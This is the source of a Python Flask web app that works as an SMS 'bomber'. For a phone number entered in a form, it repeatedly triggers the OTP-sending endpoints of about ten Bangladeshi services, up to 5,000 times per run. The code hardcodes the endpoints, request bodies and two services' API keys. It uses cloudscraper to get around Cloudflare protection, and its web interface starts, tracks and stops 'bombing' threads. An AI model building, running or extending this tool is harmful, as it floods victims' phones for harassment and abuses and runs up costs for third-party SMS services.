from flask import Flask, Blueprint, render_template, jsonify, request, redirect, url_for
from cloudscraper import create_scraper
import requests
import threading

app=Flask(__name__)
app.config['SECRET_KEY']='somerandomkey'
views=Blueprint('views', __name__)

threadid=10000
all_threads={}

def get(url, params=None, max=10, cloudscraper=False, **kwargs):
	err=0
	while err<max:
		try:
			if cloudscraper:
				request=create_scraper()
				out=request.get(url, params=params, **kwargs)
			else:
				out=requests.get(url, params=params, **kwargs)
			return out
		except:
			err+=1
	return 'False'

def post(url, data=None, json=None, max=10, cloudscraper=False, **kwargs):
	err=0
	while err<max:
		try:
			if cloudscraper:
				request=create_scraper()
				out=request.post(url, data=data, json=json, **kwargs)
			else:
				out=requests.post(url, data=data, json=json, **kwargs)
			return out
		except:
			err+=1
	return 'False'

def calc_percent(minimum, maximum, current):
	return float("{:.1f}".format((((current - minimum) * 100) / (maximum - minimum))))

class Bomb_Thread(threading.Thread):
	def __init__(self, number, amount, mode):
		super().__init__()
		self.number=number
		self.amount=amount
		self.mode=mode
		self.running=True
		self.done=False
		self.total=0
		self.sent=0
		self.failed=0
		self.progress=0

	def commit(self, success:bool):
		self.total+=1
		if success==True:
			self.sent+=1
		elif success==False:
			self.failed+=1
		self.progress=calc_percent(0, self.amount, self.sent)
		if self.sent>=self.amount:
			self.done=True
			self.stop()

	def run(self):
		#====================== BINGE =======================================
		# UNLIMITED
		binge_url = "https://web-api.binge.buzz/api/v2/otp/send"
		binge_headers = {'Device-Type': 'web', 'Content-Type': 'application/json'}
		binge_data = '{"phone":"+88'+self.number+'"}'
		binge_identifier= 'OTP sent successfully'
		#====================== BYJUS =======================================
		byjus_url='https://students.byjus.com/mobiles/request_otp?mobile=%2B880-'+self.number
		byjus_identifier='OTP sent'
		#====================== AGORA =======================================
		# UNLIMITED
		agora_url = "https://agorasuperstores.com/customers/send_sms"
		agora_data = "mobile_number="+self.number
		agora_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		# Identifier is make sure the response is digit
		#====================== SHAJGOJ =====================================
		shajgoj_url = "https://shop.shajgoj.com/wp-admin/admin-ajax.php"
		shajgoj_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		shajgoj_data = "action=xoo_ml_login_with_otp&xoo-ml-phone-login="+self.number
		shajgoj_identifier='"otp_sent":1'
		#====================== BONGO =======================================
		bongo_url = "https://api.bongo-solutions.com/auth/api/login/send-otp"
		bongo_headers = {'Content-Type': 'application/json'}
		bongo_data = '{"operator":"all","msisdn":"'+self.number+'"}'
		bongo_identifier='success'
		#====================== FUNDESH =====================================
		fundesh_url = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
		fundesh_headers = {'Content-Type': 'application/json'}
		fundesh_data = '{"msisdn":"'+self.number[1:]+'"}'
		fundesh_identifier='OTP_SENT_SUCCESS'
		#====================== FUNDESH RESEND ==============================
		fundesh_resend_url = "https://fundesh.com.bd/api/auth/resendOTP"
		fundesh_resend_headers = {'Content-Type': 'application/json'}
		fundesh_resend_data = '{"msisdn":"'+self.number[1:]+'"}'
		fundesh_resend_identifier='OTP_RESEND_SUCCESS'
		#====================== HOICHOI =====================================
		hoichoi_url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
		hoichoi_headers = {'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef', 'Content-Type': 'application/json'}
		hoichoi_data = '{"requestType":"send","phoneNumber":"+88'+self.number+'"}'
		hoichoi_identifier='"sent":"true"'
		#====================== BIOSCOPE ====================================
		bioscope_url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+self.number+"&operator=bd-otp"
		bioscope_identifier='SUCCESS'
		#====================== SWAP ========================================
		swap_url = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
		swap_headers = {'x-authorization': 'QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3', 'Content-Type': 'application/json'}
		swap_data = '{"mobile_number":"'+self.number+'","referral":false}'
		swap_identifier='"success":true'
		#====================== PICKABOO ====================================
		# Unlimited
		pickaboo_url = "https://www.pickaboo.com/smsprofile/otp/send/"
		pickaboo_headers = {'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded'}
		pickaboo_data = "mobile="+self.number+"&eventType=customer_signup_otp&resend=0"
		pickaboo_identifier='"Success":"success"'
		#====================================================================
		if self.mode=='powered':
			while True:
				binge=post(binge_url, headers=binge_headers, data=binge_data)
				if binge_identifier in binge.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				byjus=get(byjus_url)
				if byjus_identifier in byjus.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				agora=post(agora_url, headers=agora_headers, data=agora_data, cloudscraper=True)
				if agora.text.isdigit():
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				shajgoj=post(shajgoj_url, headers=shajgoj_headers, data=shajgoj_data)
				if shajgoj_identifier in shajgoj.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				bongo=post(bongo_url, headers=bongo_headers, data=bongo_data)
				if bongo_identifier in bongo.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				fundesh=post(fundesh_url, headers=fundesh_headers, data=fundesh_data)
				if fundesh_identifier in fundesh.text:
					self.commit(True)
				if not self.running:
					break
				else:
					fundesh_resend = post(fundesh_resend_url, headers=fundesh_resend_headers, data=fundesh_resend_data)
					if fundesh_resend_identifier in fundesh_resend.text:
						self.commit(True)
					else:
						self.commit(False)
					if not self.running:
						break
				hoichoi=post(hoichoi_url, headers=hoichoi_headers, data=hoichoi_data)
				if hoichoi_identifier in hoichoi.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				bioscope=get(bioscope_url)
				if bioscope_identifier in bioscope.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				swap=post(swap_url, headers=swap_headers, data=swap_data)
				if swap_identifier in swap:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				pickaboo=post(pickaboo_url, headers=pickaboo_headers, data=pickaboo_data)
				if pickaboo_identifier in pickaboo.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
		if self.mode=='rapid':
			while True:
				binge=post(binge_url, headers=binge_headers, data=binge_data)
				if binge_identifier in binge.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				agora=post(agora_url, headers=agora_headers, data=agora_data, cloudscraper=True)
				if agora.text.isdigit():
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break
				pickaboo=post(pickaboo_url, headers=pickaboo_headers, data=pickaboo_data)
				if pickaboo_identifier in pickaboo.text:
					self.commit(True)
				else:
					self.commit(False)
				if not self.running:
					break

	def stop(self):
		self.running=False

def add_bomb(number, amount, mode):
	global all_threads
	global threadid
	newth=threadid+1
	while not threadid==newth:
		threadid+=1
	all_threads[str(threadid)]=Bomb_Thread(number, amount, mode)
	all_threads[str(threadid)].setDaemon(True)
	all_threads[str(threadid)].start()
	return threadid

def find_bomb(thid, max=20):
	err=0
	while err<max:
		try:
			thread=all_threads[str(thid)]
			return thread
		except:
			err+=1
	return False

@views.route('/', methods=['GET', 'POST'])
def home():
	if request.method=='POST':
		number=request.form.get('number', '', str)
		amount=request.form.get('amount', '', str)
		mode=request.form.get('mode', '', str)
		if not number.isdigit():
			return jsonify({'success':False, 'message':'Invalid Number', 'category':'alert-secondary'})
		if not len(number)==11:
			return jsonify({'success':False, 'message':'Invalid Number', 'category':'alert-secondary'})
		if not amount.isdigit():
			return jsonify({'success':False, 'message':'Invalid Amount', 'category':'alert-secondary'})
		amount=int(amount)
		if amount<1:
			return jsonify({'success':False, 'message':'Invalid Amount', 'category':'alert-secondary'})
		if amount>5000:
			return jsonify({'success':False, 'message':'Invalid Amount', 'category':'alert-secondary'})
		if not mode in ['rapid', 'powered']:
			return jsonify({'success':False, 'message':'Invalid Mode', 'category':'alert-secondary'})
		thid=add_bomb(number, amount, mode)
		return jsonify({'success':True, 'message':'Number added to thread', 'category':'alert-success', 'id':thid})

	return render_template('index.html')

@views.route('/progress/<thid>', methods=['GET', 'POST'])
def progress(thid):
	thread=find_bomb(thid)
	if not thread:
		return render_template('thread_err.html'), 404
	number=thread.number
	amount=thread.amount
	running='yes' if thread.running else 'no'
	completed='yes' if thread.done else 'no'
	mode=thread.mode
	total=thread.total
	sent=thread.sent
	failed=thread.failed
	prog=thread.progress
	progress=f"{prog}%"
	if request.method=='POST':
		return jsonify({'id':thid, 'number':number, 'mode':mode, 'amount':amount, 'running':running, 'completed':completed, 'total':total, 'sent':sent, 'failed':failed, 'progress':progress})

	return render_template('progress.html', threadid=thid, mode=mode, number=number, amount=amount, running=running, completed=completed, total=total, sent=sent, failed=failed, progress=progress)

@views.route('/stop/<thid>', methods=['GET', 'POST'])
def stop(thid):
	if request.method=='GET':
		return redirect(url_for('views.progress', thid=thid))
	thread=find_bomb(thid)
	if not thread:
		return jsonify({'stopped':False, 'message':'Thread not found', 'category':'alert-danger'})
	if not thread.running:
		return jsonify({'stopped':False, 'message':'Bombing already stopped', 'category':'alert-danger'})
	thread.stop()
	return jsonify({'stopped':True, 'message':'Successfully stopped', 'category':'alert-success'})

@views.route('/favicon.ico', methods=['GET', 'POST'])
def favicon():
	return redirect(url_for('static', filename='favicon/favicon.ico'))

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

app.register_blueprint(views, url_prefix='/')
if __name__ == '__main__':
	app.run(host='0.0.0.0', port=80, debug=False)
